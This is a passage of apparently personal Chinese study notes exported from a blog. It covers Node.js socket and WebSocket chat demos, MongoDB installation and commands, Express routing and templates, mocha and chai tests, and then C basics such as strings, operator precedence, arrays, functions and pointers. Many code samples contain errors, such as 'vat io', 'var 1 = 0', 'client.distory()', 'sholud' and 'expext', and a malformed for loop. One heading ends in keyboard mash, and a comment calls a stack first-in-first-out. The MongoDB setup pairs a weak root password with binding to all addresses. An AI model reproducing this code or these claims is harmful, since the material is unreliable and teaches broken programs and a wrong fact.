console.log(results);\n})\n//这里没加异步，按照串行顺序依次下来的\n\n```\n\n\n\n\n\n\n\n## 六. Socket\n\n<img src=\"http://image.xpshuai.cn/socket.png\"></img>\n\n\n\n\n\n#### 1). 基于`net`模块实现socket\n\n**聊天案例**\n\nserver.js\n\n```javascript\nvar net = require('net')\nvar chatServer = net.createServer(),\n    clientMap = new Object()\n\nvar i = 0; //客户端连接流水号\nchatServer.on('connection', function (client){\n  client.name = ++i\n  clientMap[client.name] = client\n  console.log(\"客户端 \"+ client.name +\" 连接成功~\");\n\n  //对客户端发送消息的监听\n  client.on('data', function (data){\n    console.log(\"客户端传来：\" + data);\n    broadcast(data, client) //广播给其他\n  })\n\n  //数据错误的处理\n  client.on('error', function (err){\n    console.log(\"client error: \" + err);\n    client.end()\n  })\n\n  //客户端关闭事件\n  client.on('close', function (data){\n      delete clientMap[client.name]\n      console.log(client.name + \"下线了\");\n      broadcast(client.name+\"下线了\", client) //广播给其他\n  })\n})\n\nchatServer.listen(9000)  //监听端口\n\n//消息广播\nfunction broadcast (message, client){\n  for(var key in clientMap){\n    clientMap[key].write(client.name + ' say:' + message + \"\\n\")\n  }\n}\n\n```\n\nclient.js\n\n```javascript\nvar net = require('net')\nvar port = 9000\nvar host = '127.0.0.1'\n\nvar client = new net.Socket()\nclient.setEncoding = 'UTF-8'\n\n//连接服务器\nclient.connect(port, host, function () {\n  client.write(\"您好\")\n})\n\n//监听服务端消息\nclient.on('data', function (data) {\n  console.log(\"服务端传来：\" + data);\n  say()\n})\n\nclient.on('error', function (err){\n  console.log(err);\n})\n\nclient.on('close', function (err){\n  console.log('connection closed');\n})\n\nconst readline = require('readline')\nconst r1 = readline.createInterface({\n  input: process.stdin,   //标准输入\n  output: process.stdout\n})\n\nfunction say() {\n  r1.question('请输入：', (inputStr => {\n    if (inputStr != 'bye'){\n      client.write(inputStr + '\\n')\n    }else{\n      client.distory() //关闭连接\n      r1.close()\n    }\n  }))\n}\n\n```\n\n\n\n#### 2). 浏览器原生支持的`WebSocket`\n\n`npm install ws`\n\n案例同上\n\nserver.js\n\n```javascript\nvar wbsocketServer = require('ws').Server,\n    wss = new wbsocketServer({port:9001})\nvar clientMap = new Object()\nvar i=0\n\nwss.on('connection', function (ws){\n  ws.name = ++i\n  clientMap[ws.name] = ws\n  console.log(ws.name + \" 上线了\");\n\n  ws.on('message', function (message){\n    broadcast(message, ws)\n  })\n  ws.on('close', function (message){\n    // global.gc()  //调用内存回收\n    console.log(ws + \" 离开\");\n  })\n})\n\n\n//广播方法\nfunction broadcast(msg, ws){\n  for(var key in clientMap){\n    clientMap[key].send(ws.name + '说：' + msg)\n  }\n}\n\n```\n\nclient.js\n\n```javascript\nvar WebSocket = require('ws')\nvar ws = new WebSocket('ws://127.0.0.1:9001/')\n\nws.onopen = function () {\n  ws.send('大家好')\n}\n\nws.onmessage = function (event) {\n  var chatroom = document.getElementById('chatroom')\n  chatroom.innerHtml += '</br>' + event.data\n}\n\nws.onclose = function () {\n  alert('Closed')\n}\n\nws.onerror = function (err) {\n  alert('Error:' + err)\n}\n\n```\n\n\n\nchat.html\n\n```html\n  <body>\n  <div id=\"chatroom\"></div>\n  <input type=\"text\" name=\"sayinput\" id=\"sayinput\" value=\"\">\n  <input type=\"button\" name=\"send\" id=\"sendbutton\" value=\"发送\">\n\n  <script src=\"client.js\"></script>\n  <script type=\"text/javascript\">\n      function send(){\n        ws.send(sayinput.value)\n        sayinput.vaule = \"\"\n        }\n        document.onkeyup = function(event){\n          if (event.keycode == 13){\n            send()\n          }\n        }\n        sendbutton.onclick = function (){\n          send()\n        }\n\n  </script>\n  </body>\n```\n\n\n\n#### 3). `socket.io`实现socket\n\n当浏览器不支持html5时，就不能用websocket了\n\n借助express实现: `npm i express socket.io`\n\nsocket_io.js\n\n```javascript\nvar app = require('express')()\nvar http = require('http').Server(app)\nvat io = require('socket.io')(http)\nvar fs = require('fs')\n\napp.get('/', (req,res)=>{\n  function callback(data) {\n    res.send(data.toString())\n  }\n  fs.readFile('socketIOClient.html', function (err, data){\n      if(err){\n        console.log(err);\n        console.log(\"文件不存在\");\n      }else{\n        callback(data)\n      }\n  })\n})\n\n// app.get('/socket.io.js')\n\n\n//socket.io的设置\n//在线用户\nvar onlineUsers = {}\n//在线人数\nvar onlineCount = 0\n\nvar 1 = 0\n\nio.on('connection', function (socket){\n  console.log(\"有人上线了\");\n  //监听新用户加入\n  socket.name = i\n  onlineUsers[socket.name] = socket\n\n  //监听用户退出\n  socket.on('disconnect', function (){\n    console.log(\"有人退出了\");\n    delete onlineUsers[socket.name]\n  })\n\n  //监听用户发布的聊天内容\n  socket.on('message', function (msg){\n      broadcast(msg, socket)\n  })\n})\n\n//广播方法\nfunction broadcast(msg, socket){\n  for(var key in onlineUsers){\n    onlineUsers[key].send(socket.name + '说：' + msg)\n  }\n}\n\nhttp.listen(9002, function (){\n  console.log(\"\");\n})\n\n```\n\nhtml\n\n```javascript\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <title></title>\n    <style>\n    #chatroom{\n      width:400px;\n      height:600px;\n      overflow:auto;\n      border:1px solid bule\n    }\n  </style>\n  <script src=\"./socket.io.js\"></script>\n  </head>\n  <body>\n      <script type=\"text/javascript\">\n        var iosocket = null;\n        windows.onload = function (){\n          iosocket = io.connect('http://127.0.0.1/9002')\n\n          iosocket.on('connect'. function (){\n            iosocket.send('hello, from inclient')\n          })\n\n          //接收数据\n          iosocket.on('message', function (message){\n            var chatroom = document.getElementById(\"chatroom\");\n            chatroom.innerHtml += message = '</br>'\n          })\n\n          //断开连接\n          iosocket.on('disconnect', function (){\n            console.log(\"服务端关闭\");\n          })\n\n          function send(){\n            iosocket.send(sayinput.value)\n            sayinput.value = \"''\"\n          }\n          document.onkeyup = function(event){\n            if (event.keycode == 13){\n              send()\n            }\n          }\n          sendbutton.onclick = function (){\n            send()\n          }\n        }\n      </script>\n\n\n  <div id=\"chatroom\"></div>\n  <input type=\"text\" name=\"sayinput\" id=\"sayinput\" value=\"\">\n  <input type=\"button\" name=\"send\" id=\"sendbutton\" value=\"发送\">\n\n\n  </body>\n</html>\n\n```\n\n\n\n## 七.MongoDB\n\n#### 安装(Linux下)\n\n**1. 通过公钥对资源包一致性和真实性进行验证：**\n\n```bash\n\nsudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4\n\n```\n\n**2. 运行下行命令，创建文件/etc/apt/sources.list.d/mongodb-org-4.0.list：**\n\n```bash\necho \"deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list\n```\n\n**3. 在安装之前，先更新系统资源包：**\n\n```bash\nsudo apt-get update\n```\n\n**4. 安装mongodb资源包：**\n\n```bash\n# 安装MongoDB server\nsudo apt-get install -y mongodb-org \n\n# 安装MongoDB 客户端\nsudo apt-get install mongodb-clients\n```\n\n**4. 检验是否安装成功：**\n\n启动mongod服务：\n\n```bash\nsudo service mongod start \n\n#查看mongo版本:\nmongo --version\n```\n\n**5.登录MongoDB并设置密码**\n\n```bash\n# 登录\nmongo\n# 切换到admin数据库\nuse admin\n# 创建admin账号，密码::admin111 权限：root权限，授权的数据库名：admin\ndb.createUser({user:\"admin\", pwd:\"admin111\", roles:[{role:\"root\", db:\"admin\"}]})\n```\n\n编辑MongoDB配置文件\n\n```bash\nvim /etc/mongod.conf\n\nnet:\n  port: 27017  # 端口\n  bindIp: 0.0.0.0  # 允许访问的地址，0.0.0.0表示所有\n\nsecurity:\n  authorization: enabled\n```\n\n重启MongoDB服务\n\n```bash\nsystemctl restart mongod.service\n```\n\n测试登录\n\n```bash\nmongo -u admin -p admin111 --authenticationDatabase admin\n```\n\n\n\n##### 学习\n\n> 与mysql语法对比：https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg\n\n###### 术语、概念\n\n\n\n![](http://image.xpshuai.cn/socket.png)\n\n![](http://image.xpshuai.cn/mysql2.png)\n\n**MongoDB集合**\n\n一个数据库可以有多个集合(对应mysql的table)\n\n**MongoDB文档**\n\n键值对\n\n如：`{'name':'xps', 'like':['code','play']}`\n\n\n\n**MongoDB数据类型**\n\n![](http://image.xpshuai.cn/type.png)\n\n\n\n#### 常用命令\n\n###### 1.数据库操作\n\n查看帮助\n\n```bash\nhelp\ndb.help()\ndb.test.help()\ndf.test.find().help()\n```\n\n创建/切换数据库\n\n```bash\nuse music  # 如果不存在就创建，存在且切换\n```\n\n查询数据库\n\n```bash\nshow dbs   # 当数据库为空时，是不显示的\n\n# 我们向一个集合里面插入一个文档\ndb.user.insertOne({'name':'xps','like':['code','play']})\n# 查看集合里面的文档(行)\ndb.user.find()\n```\n\n查看当前使用的数据库\n\n```bash\ndb\n#\ndb.getName()\n```\n\n显示当前DB状态\n\n```bash\ndb.stats()\n```\n\n查看当前DB版本\n\n```bash\ndb.version()\n```\n\n查看当前DB的链接机器地址\n\n```bash\ndb.getMongo()\t\t\n```\n\n删除数据库\n\n```bash\ndb.dropDatabase()\n```\n\n\n\n###### 2.集合（Collection）操作\n\n....写了半天，忘了保存，算了，放图片吧....\n\n<img src=\"http://image.xpshuai.cn/collec.png\"></img>\n\n\n\n###### 3.文档操作\n\n对集合内数据增删改查\n\n\n\n<img src=\"http://image.xpshuai.cn/collec.png\"></img>\n\n\n\n删除\n\n```bash\ndb.user.remove({'name':'xps'})\ndb.user.delete({'name':'xps'})\ndb.user.deleteMany({'name':'xps'})\n```\n\n\n\n\n\n<img src=\"http://image.xpshuai.cn/q1.png\"></img>\n\n<img src=\"http://image.xpshuai.cn/q2.png\"></img>\n\n<img src=\"http://image.xpshuai.cn/q3.png\"></img>\n\n\n\n\n\n## 八. Express框架\n\n> 一个node.js的web框架\n\n\n\n#### 1). 准备\n\n**安装**\n\n`npm install express --save`, Windows下还有:`npm install -g express-generator `\n\n`express -h` 测试安装成功\n\n新建项目：`express test_express    ` \n\n**目录结构：**\n\npackage.js是需要的依赖，切换到项目根目录手动安装`npm install`\n\napp.js是入口\n\nwww/bin下面是端口等配置\n\n\n\n**启动项目：**\n\n```bash\nnpm start\n```\n\n\n\n#### 2). Express初始化项目详解\n\n一些模块\n\n```json\n  \"dependencies\": {\n    //\"body-parser\": \"~1.15.2\",   // 解析前端提交的数据\n    \"cookie-parser\": \"~1.4.4\",   //解析cookie\n    \"debug\": \"~2.6.9\",    // 用来显示调试信息\n    //\"ejs\": \"~2.5.2\",   //模板，渲染页面   \n    \"express\": \"~4.16.1\",  \n    \"http-errors\": \"~1.6.3\", \n    \"jade\": \"~1.11.0\",   //模板，渲染页面\n    \"morgan\": \"~1.9.1\"   //日志，控制后格式化显示信息\n  }\n```\n\n\n\n`bin/www`入口文件\n\n实现了创建服务和中间件、路由配置\n\n```javascript\n\nnormalizePort() 方法，对端口进行简单处理\n\n\n1.路由中间件\n2.自定义中间件（app.set('port', port)这样）\n\napp.use()\n\n```\n\n\n\n`app.js`\n\n```javascript\napp.use(express.static(path.join(__dirname, 'public')));   //设置静态文件路径\n...\n```\n\n```javascript\nvar usersRouter = require('./routes/users');\napp.use('/users', usersRouter);\n```\n\n\n\n`router/xxx.js` 路由的中间件\n\n```\n //这里的index就是view下面的index.jade\nres.render('index', { title: 'Express' });  //渲染模板 ， index不用写后缀名\n```\n\n```javascript\n#比如 index.js\nvar express = require('express');\nvar router = express.Router();\n\n// get('/', xxx) 因为前面写了/user，所以这里只写/即可\nrouter.get('/', function(req, res, next) { \n  res.send('respond with a resource');\n});\n\nmodule.exports = router;  // 暴露出去，才能以中间件的形式存在\n```\n\n\n\n`views/xxx.jade` 模板文件\n\n\n\n#### 3). Express中的路由\n\nusers.js\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\n\n/* GET users listing. */\nrouter.get('/', function(req, res, next) {\n  res.send('respond with a resource');\n});\n\n// 第二层路由，第一层在app.js里\nrouter.get('/list', function(req, res) {\n  res.send('user list');\n});\n\n// 可以写成表达式（正则）\nrouter.get('/a*d', function(req, res) {\n  res.send('表达式路由');\n});\n\n\n//转到一个文件\nrouter.get('/form', function(req, res) {\n  res.sendFile(__dirname + '/form.html')\n});\n\n//post请求\nrouter.post('/save', function(req, res) {\n  res.send(\"表单提交!\")\n});\n\n// all， post和get都接收\nrouter.all('/all',function(req, res) {\n  res.send(\"post和get都接收!\")\n});\n\n\nmodule.exports = router;\n\n```\n\nform.html\n\n```html\n<form action=\"/users/save\" method=\"post\" class=\"formClass\">\n    <label for=\"username\">\n        username: <input type=\"text\" name=\"username\" value=\"\"/>\n    </label>\n    <label for=\"submit\">\n        <input type=\"submit\" value=\"提交\" />\n    </label>\n\n</form>\n```\n\n\n\n#### 4). Express中的模板\n\nejs/jade等\n\nejs比较简单\n\n```javascript\n#安装（express内置了ejs）\nnpm install ejs --save\n\n#配置ejs模板引擎\napp.set('view engine','ejs')\n\n#渲染页面\nrender(filename,json)接收两个参数。\n\n#如下\napp.get('/learnejs',function(req,res){\n   let arr=['吃饭','睡觉','打豆豆']\n    res.render('index',{\n        list_a:arr\n    })\n})\n\n\n#index.ejs\n<ul>\n    <%for(var i=0;i<list_a.length;i++){%>\n    <li><%=list[i]%></li>\n    <%}%>\n</ul>\n```\n\n渲染页面\n\n```javascript\n#\nrender(filename,json)接收两个参数。\n```\n\n常用标签\n\n```javascript\n<%  %>   流程控制标签\n<%= %>\t 输出标签（原文输出html标签）\n<%- %>\t 输出标签（html会被浏览器解析）\n<%# %>\t 注释标签\n%\t\t 对标记进行转义\n```\n\n`includes`,在一个模板里面引用另一个模板\n\n```javascript\n<%- include(\"模板路径\", {user:\"传递的参数内容\"})  %>\n```\n\n\n\n\n\n\n\n## 九.mocha\n\n> 前端测试框架\n\n浏览器和Node环境都可使用\n\n\n\n安装：\n\n```\n\n# 安装\nnpm install mocha -g\n\n#命令\nmocha\n\n#本地安装\nnpm install mocha -D\n\n# 修改配置文件中test命令\n\"test\": \"......./bin/mocha\"\n\n\n# 运行\nnpm test\n\n```\n\n\n\n#### 基本用法\n\n**定义测试：**\n\n创建一个js文件\n\n```javascript\ndescribe(\"Demo\", function (){\n    describe(\"方法1\", function (){\n        before(function (){  //测试之前做的内容\n            console.log(\"---测试之前做的内容\")\n        })\n        after(function (){  //测试之后做的内容\n            console.log(\"---测试之前后做的内容\")\n        })\n       beforeEach(function (){  //每条测试之前做的内容\n            console.log(\"---每条测试之前做的内容\")\n        })\n        context(\"情景1\", function (){\n            it(\"测试1\", function (){\n                \n            })\n            it(\"测试2\", function (){\n                \n            })\n        })\n    })\n})\n\n```\n\n`mocha` 来启动测试/ 或使用本地安装的mocha来测试`npm test`\n\n\n\n\n\n#### assert断言\n\n使用库：`chai`\n\n- chai: 断言库\n- chai: should分割的断言\n- chai：expect风格的断言\n\n安装到本地：`npm install  chai -D`\n\n\n\n**使用**\n\n```javascript\nconst chai = require('chai')\nconst assert = chai.assert\n\ndescribe('Demo', function (){\n  it(\"使用 assert风格的断言测试\", function (){\n    var val = 'hello'\n    assert.typeOf(val, 'string')\n    assert.equal('hello')\n  })\n})\n\n```\n\n```javascript\nconst chai = require('chai')\nconst sholud = chai.sholud\n\ndescribe('Demo', () => {\n  it(\"使用 sholud风格的断言测试\", function (){\n    var val = 'hello'\n    val.sholud.exist\n    val.sholud.be.a('string')\n    val.sholud.equal('hello')\n    val.sholud.not.equal('hello')\n    val.sholud.have.length()\n    //多个条件逻辑与\n    val.sholud.equal('hello').and.exist.and.be.a('string')\n  })\n})\n```\n\n```javascript\nconst chai = require('chai')\nconst expect = chai.expect\n\ndescribe('Demo', () => {\n  it(\"使用 expect风格的断言测试\", function (){\n    var val = 'hello'\n    var number = 3\n    \n    expext(number).to.be.at.most(5)\n    expext(number).to.be.at.least(3)\n    expext(number).to.be.at.within(1,8)\n      \n    expect(value).to.exist\n    expect(value).to.be.a('string')\n    expect(value).to.equal('hello')\n    expect(value).to.not.equal('hello')\n    expect(value).to.have.length(5)\n  })\n})\n```\n\n\n\n\n\n#### 运行多个测试\n\n```bash\n\nmocha --recursive   # 递归\n```\n\n\n\n好了，再学就跑偏了...... :smile:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["编程"],"categories":["Node.js"]},{"title":"C语言琐碎复习（内容简单,仅自己看）","url":"%2Fposts%2F37285%2F","content":"\n\n  \n> 由于好久时间不看C了，好多东西都忘了\n>\n> 本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈\n\n\n  \n#### 字符串\n\n```c\nchar greeting[6] = {'H', 'e', 'l', 'l', 'o', '\\0'};\n\n\n//1\tstrcpy(s1, s2);\n复制字符串 s2 到字符串 s1。\n    \n//2\tstrcat(s1, s2);\n连接字符串 s2 到字符串 s1 的末尾。\n    \n//3\tstrlen(s1);\n返回字符串 s1 的长度。\n    \n//4\tstrcmp(s1, s2);\n如果 s1 和 s2 是相同的，则返回 0；如果 s1<s2 则返回小于 0；如果 s1>s2 则返回大于 0。\n    \n//5\tstrchr(s1, ch);\n返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。\n    \n//6\tstrstr(s1, s2);\n返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。\n   \n    \n//strlen 与 sizeof的区别：\nstrlen 是函数\nsizeof 是运算操作符\n二者得到的结果类型为 size_t，即 unsigned int 类型。\n\nsizeof 计算的是变量的大小，不受字符 \\0 影响；\nstrlen 计算的是字符串的长度，以 \\0 作为长度判定依据。\n    \n   \n// 'a' 表示是一个字符，\"a\" 表示一个字符串相当于 'a'+'\\0';\n    \n    \n//字符串遍历\nchar hi[] = \"hello\";\nfor(i==0, i<6,i++)\n{\n    printf(\"%c\",hi[i]);\n}\n```\n\n\n\n#### 运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj\n\n| **优先级** | **运算符**       | **名称或含义**            | **使用形式**              | **结合方向** | **说明**         |\n| ---------- | ---------------- | ------------------------- | ------------------------- | ------------ | ---------------- |\n| **1**      | []               | 数组下标                  | 数组名[常量表达式]        | 左到右       |                  |\n| ()         | 圆括号           | （表达式）/函数名(形参表) |                           |              |                  |\n| .          | 成员选择（对象） | 对象.成员名               |                           |              |                  |\n| ->         | 成员选择（指针） | 对象指针->成员名          |                           |              |                  |\n| **2**      | -                | 负号运算符                | -表达式                   | **右到左**   | 单目运算符       |\n| (类型)     | 强制类型转换     | (数据类型)表达式          |                           |              |                  |\n| ++         | 自增运算符       | ++变量名/变量名++         | 单目运算符                |              |                  |\n| --         | 自减运算符       | --变量名/变量名--         | 单目运算符                |              |                  |\n| *          | 取值运算符       | *指针变量                 | 单目运算符                |              |                  |\n| &          | 取地址运算符     | &变量名                   | 单目运算符                |              |                  |\n| !          | 逻辑非运算符     | !表达式                   | 单目运算符                |              |                  |\n| ~          | 按位取反运算符   | ~表达式                   | 单目运算符                |              |                  |\n| sizeof     | 长度运算符       | sizeof(表达式)            |                           |              |                  |\n| **3**      | /                | 除                        | 表达式/表达式             | 左到右       | 双目运算符       |\n| *          | 乘               | 表达式*表达式             | 双目运算符                |              |                  |\n| %          | 余数（取模）     | 整型表达式/整型表达式     | 双目运算符                |              |                  |\n| **4**      | +                | 加                        | 表达式+表达式             | 左到右       | 双目运算符       |\n| -          | 减               | 表达式-表达式             | 双目运算符                |              |                  |\n| **5**      | <<               | 左移                      | 变量<<表达式              | 左到右       | 双目运算符       |\n| >>         | 右移             | 变量>>表达式              | 双目运算符                |              |                  |\n| **6**      | >                | 大于                      | 表达式>表达式             | 左到右       | 双目运算符       |\n| >=         | 大于等于         | 表达式>=表达式            | 双目运算符                |              |                  |\n| <          | 小于             | 表达式<表达式             | 双目运算符                |              |                  |\n| <=         | 小于等于         | 表达式<=表达式            | 双目运算符                |              |                  |\n| **7**      | ==               | 等于                      | 表达式==表达式            | 左到右       | 双目运算符       |\n| !=         | 不等于           | 表达式!= 表达式           | 双目运算符                |              |                  |\n| **8**      | &                | 按位与                    | 表达式&表达式             | 左到右       | 双目运算符       |\n| **9**      | ^                | 按位异或                  | 表达式^表达式             | 左到右       | 双目运算符       |\n| **10**     | \\|               | 按位或                    | 表达式\\|表达式            | 左到右       | 双目运算符       |\n| **11**     | &&               | 逻辑与                    | 表达式&&表达式            | 左到右       | 双目运算符       |\n| **12**     | \\|\\|             | 逻辑或                    | 表达式\\|\\|表达式          | 左到右       | 双目运算符       |\n| **13**     | ?:               | 条件运算符                | 表达式1? 表达式2: 表达式3 | 右到左       | 三目运算符       |\n| **14**     | =                | 赋值运算符                | 变量=表达式               | **右到左**   |                  |\n| /=         | 除后赋值         | 变量/=表达式              |                           |              |                  |\n| *=         | 乘后赋值         | 变量*=表达式              |                           |              |                  |\n| %=         | 取模后赋值       | 变量%=表达式              |                           |              |                  |\n| +=         | 加后赋值         | 变量+=表达式              |                           |              |                  |\n| -=         | 减后赋值         | 变量-=表达式              |                           |              |                  |\n| <<=        | 左移后赋值       | 变量<<=表达式             |                           |              |                  |\n| >>=        | 右移后赋值       | 变量>>=表达式             |                           |              |                  |\n| &=         | 按位与后赋值     | 变量&=表达式              |                           |              |                  |\n| ^=         | 按位异或后赋值   | 变量^=表达式              |                           |              |                  |\n| \\|=        | 按位或后赋值     | 变量\\|=表达式             |                           |              |                  |\n| **15**     | ,                | 逗号运算符                | 表达式,表达式,…           | 左到右       | 从左向右顺序运算 |\n\n> 注：同一优先级的运算符，运算次序由结合方向所决定。\n\n\n\n#### 数组\n\nmain.c\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n// 2.二维数组\n\n/**\nint a[3][4];\n总共12个元素，可以当做3行4列看待，依次是:\na[0][0],a[0][1],a[0][2],a[0][3]\na[1][0],a[1][1],a[1][2],a[1][3]\na[2][0],a[2][1],a[2][2],a[2][3]\n\na[i][j]  ==> i+1行，j+1列的元素\n\nint a[m][n];  该二位数组的右下角位置的元素只能是a[m-1][n-1]\n\n*/\n\nvoid init_double()\n{\n\t//1.最笨的初始化\n\tint a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12};\n\n\t//2.分开写（格式要写正确）\n\tint b[3][4]={\n\t\t{1,2,3,4},\n\t\t{5,6,7,8},\n\t\t{9,10,11,12}\n\t};\n\t\n\t//3.其他各种初始化\n\n\n\n\t// 输出二维数组内容\n\tint i, j;\n\tfor(i=0;i<3;++i)\n\t{\n\t\tfor(j=0; j<4; ++j)\n\t\t{\n\t\t\tprintf(\"%-5d \\t\", b[i][j]);    // 付好：左对齐，5代表占5个位置（这不是重点，格式控制有其他控制办法）\n\t\t}\n\t\tprintf(\"\\n\");  // 格式化(每四个一行)\n\t}\n\n\n\t// 二维数组排序\n\t//求每一行最大值\n\t//\n\n}\n\n\n// 多维数组：\n/*\n1. 不存在! 因为内存是线性一维的\n2. n维数组可以当做 每个元素是n-1维数组的一维数组 的数组\n比如：a[3][4]，可以当做含有三个元素的一维数组，只不过每个元素都可以划分为4个小元素\n\n*/\n\n\n```\n\n\n\n#### 函数\n\nfunc.h\n\n```c\n#include <stdio.h>\n\nint after_func();   // 函数的声明， 可以不写变量名\nvoid get_max(int, int);  // 函数声明，记得加分号\n```\n\nmain.c\n\n```c\n#include \"func.h\"\n\n\nvoid before_func()\n{\n\tprintf(\"我是函数测试，在主函数之前定义的。\");\n\tgetchar();\n}\n\n\nvoid main()\n{\n\n// 函数定义写在主函数之前的时候，那么就无需在主函数里面声明这个函数，只需要把函数体写在主函数前即可\n//否则，需要先声明.\n\n\t// 此函数定义在主函数之前，直接调用即可，无须声明\n\t//before_func();\n\n\t//在主函数之后定义的，需要先声明才能调用。\n\t//1.声明(要放在main外面，我放在了自定义的头文件里面)\n\t//2.调用\n\t//after_func();\n\n\t// 求最大值\n\t//int i,j;\n\t//i=5;j=10;\n\t//get_max(i, j);\n\tint i;\n\tfor(i=0;i<20;++i)\n\t{\n\t\tget_max(i,i+1);\n\t}\n\tgetchar();\n\n}\n\n\nint after_func()\n{\n\tprintf(\"我是函数测试，在主函数之后定义的，需要先声明才能调用。\");\n\tgetchar();\n\treturn 0;\n}\n\n\n//求最大值\nvoid get_max(int a, int b)\n{\n\tint max_val = a>b?a:b;\n\n\tprintf(\"%d和%d比较，最大值为: %d \\n\", a,b,max_val);\n}\n\n\n/*\nreturn和break的区别：\n1.break:循环、switch\n2.return终止函数\n\n*/\n\n\n/*\n函数的分类：\n1.有参函数和无参函数\n2.有返回值和无返回值\n3.库函数和用户自定义函数\n4.普通函数和主函数(main)：一个程序只能有一个主函数，主函数既是程序的入口，也是程序的出口\n主函数能调用主函数，其他函数不能调用main函数，普通函数可以相互调用\n5.值传递和引用传递(其实这样说是不对的)\n\n*/\n\n/*\n如何在软件开发中，合理的设计函数来解决实际问题：\n功能划分的详细一些，提高利用率\n函数是C语言的基本单位，类是Java，C#等的基本单位\n*/\n\n\n/*\n常用的系统函数:\n1. doulbe sqrt(double x)           求x的平方根\n2. int abs(int x)\t\t\t\t   求整数的绝对值\n3. double fabs(double x)\t       \t\t\t\n推荐书籍：\n机械工业出版社：《turboc2.0使用大全》\n*/\n\n\n/*\n递归：\n栈：先进先出\n*/\n\n\n/*\n变量的作用于和存储方式：\n1.按作用域分：全局变量，局部变量（函数内部定义的变量/函数的形参）\n2.按变量的存储方式：静态变量，自动变量，寄存器变量\n\n*/\n\nint k=99;\n\nvoid test_var()\n{\n\t//局部变量与全局变量命名相同：局部变量会屏蔽掉全局变量\n\n}\n\n```\n\n\n\n\n\n#### 指针\n\ntest.h\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\n#define N 5\n\nvoid test1();\nvoid test2();\nvoid test3();\nvoid test4();\nvoid test5();\nvoid test6();\nvoid test7();\nvoid test8();\nvoid base_pointer();\nvoid free_test();\nvoid exchange_two();\nvoid test_exchange1(int,int);\nvoid test_exchange2(int,int);\nvoid test_exchange3(int,int);\nvoid two_pointer();\nvoid dynami_memo1();\nvoid dynami_memo2();\nvoid dynami_memo3();\nvoid dynami_memo4();\nvoid dynami_memo5();\nvoid dynami_memo6();\n```\n\nmain.c\n\n```c\n#include \"test.h\"\n\nvoid main()\n{\n\t//base_pointer();\n\texchange_two();\n}\n\nvoid test1()\n{\n\tint j=3;\n\tint * q; // q是变量名, int *表示q变量存放的是int类型变量的地址（int * 是数据类型）\n\t// 错误写法：q=55;   后面不能是值，只能跟地址\n\tq=&j;   //*q与j是等同的\n\t/*\n\t1.q保存了j的地址，引起：q指向j。\n\t2.q不是j，j不是q。修改q的值不会影响j,修改j的值也不会影响q的值\n\t3.如果一个指针变量指向一个普通变量，则*指针变量完全等同于普通变量\n\t\n\t*/\n\n\t/*\n\t指针：就是地址，地址就是指针\n\t指针变量：存放地址的变量\n\t两者不是一个概念\n\t但是，通常在叙述中，会把指针变量简称为指针\n\t*/\n\n\t// 一级指针\n    // 指针的本质： 存地址(内存单元的编号)，间接访问\n    // 指针使用场景：\n\n    // & 取地址操作符/【引用】\n    // * 取值操作符/【解引用】\n\n}\n\nvoid test2()\n{\n\t/*\n\t指针的重要性;\n\t表示一些复杂的数据结构;\n\t快速的传递数据\n\t使函数返回一个以上的值\n\t能直接访问硬件\n\t能方便的处理字符串\n\t是理解面向对象语言中引用的基础\n\t*/\n\n\t//地址：\n\t/*\n\t\t内存单元的编号\n\t\t从零开始的非负整数\n\t\t范围：\n\t*/\n    \n\t//指针：\n\t/*\n\t指针就是地址，地址就是指针\n\t指针变量就是存放内存单元的变量，\n\t两者不是一个概念\n\t但是，通常在叙述中，会把指针变量简称为指针\n\t指针的本质就是一个操作受限的非负整数\n\t\n\t*/\n\n\t//指针的分类：\n\t/*\n\t1.基本类型的指针\n\tint *p;\n\tint i=10;\n\tint j;\n\tp = &i;\n\ti=*p;\n\tprintf(\"%d\",j);\n\t\n\t例子，见函数base_pointer\n\t*/\n}\n\nvoid base_pointer()\n{\n\tint *p;\n\tint *q;\n\tint i=5;\n\n\t//*p = i; //【错误】，*p代表的是p指向的地址的变量的值，p现在指向的垃圾值(还没有初始化)\n\t//应该这样\n\tp = &i;\n\n\t//*q=p;  //【错误】，有语法错误，*q是整形，p是int*类型\n\t//*q =  *p; //【错误】,语法没错，但是q指向垃圾值（没初始化）\n\t//应该这样：\n\t//p=q;  // 【错误】，q赋给p，p也变成垃圾值\n\t//printf(\"%d\\n\", *p);  // q的空间是属于本程序的，所以本程序可以读写q的内容，但是如果q的内部是垃圾值，则本程序不能读写*p的内容,因为*q所代表的的内存单元的控制权限并没有分配给本程序\n\t//\n\n\t// 指针变量的运算：\n\t// 指针变量不能相加、相乘、相除（能相减：如果两个指针变量指向的是【同一块连续空间中的不同存储单元】）\n\t/*\n\t\tp = &a[1];\n\t\tq = &a[3];\n\t\tprintf(\"%d\", q-p);\n\t*/\n\n\tgetchar();\n\n}\n\n\n//指针的偏移\nvoid test3()\n{\n    int a[N]={1,2,3,4,5};\n    int *p;\n    int i;\n    p = &a[4];  // 指向a最后一个元素\n\n    for(i=0; i<N; i++)     // 指针偏移\n    {\n        printf(\"%3d\", *(p-i));     // p +sizeof(int)\n    }\n    printf(\"\\n\");\n\n\tgetchar();\n}\n\n//指针与自增\nvoid test4()\n{\n    int a[3]={2,7,8};\n    int *p;\n    int j;\n\n    p = a;\n    j = *p++;     // j = *p; p=p+1。     \n    printf(\"a[0]=%d, j=%d, *p=%d \\n\", a[0], j, *p);  // 2,2,7\n\n    j = p[0]++; // j=p[0],  p[0] = 